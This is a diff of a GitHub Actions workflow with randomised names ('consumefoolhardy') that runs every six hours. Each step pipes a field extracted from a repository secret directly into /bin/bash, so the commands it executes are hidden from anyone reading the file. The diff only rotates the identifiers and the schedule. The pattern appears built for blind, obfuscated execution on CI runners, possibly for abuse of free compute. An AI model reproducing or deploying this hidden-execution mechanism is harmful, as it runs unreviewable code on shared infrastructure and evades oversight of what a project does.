@@ -1,27 +1,23 @@
 name: consumefoolhardy
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 3/6 * * *'
+    - cron: '37 4/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: consumefoolhardy
         env:
-          yt1: ${{ secrets.yt1 }}
+          ddhll0: ${{ secrets.ddhll0 }}
         run: |
-          echo $yt1 | jq -r .yh183 | /bin/bash
-          echo $ebbv4548 | jq -r .uvldy4 | /bin/bash
-          echo $mwkge1 | jq -r .dmucf4076 | /bin/bash
-          echo $xwz4006 | jq -r .x87189 | /bin/bash
-          echo $ljbah27 | jq -r .jrg092 | /bin/bash
-          echo $coc96 | jq -r .t05182 | /bin/bash
-          echo $pphth93 | jq -r .tymt039 | /bin/bash
-          echo $zq80 | jq -r .jdzlr19131 | /bin/bash
-          echo $cui7190 | jq -r .bbnpx838 | /bin/bash
+          echo $ddhll0 | jq -r .jxvhp86 | /bin/bash
+          echo $tvbm25292 | jq -r .gxpxi9 | /bin/bash
+          echo $fcxvx8578 | jq -r .me677 | /bin/bash
+          echo $kplbu675 | jq -r .xgw2778 | /bin/bash
+          echo $kk6 | jq -r .eo9 | /bin/bash
+          echo $boa547 | jq -r .x0 | /bin/bash
+          echo $cysa6 | jq -r .nxnha28119 | /bin/bash
 
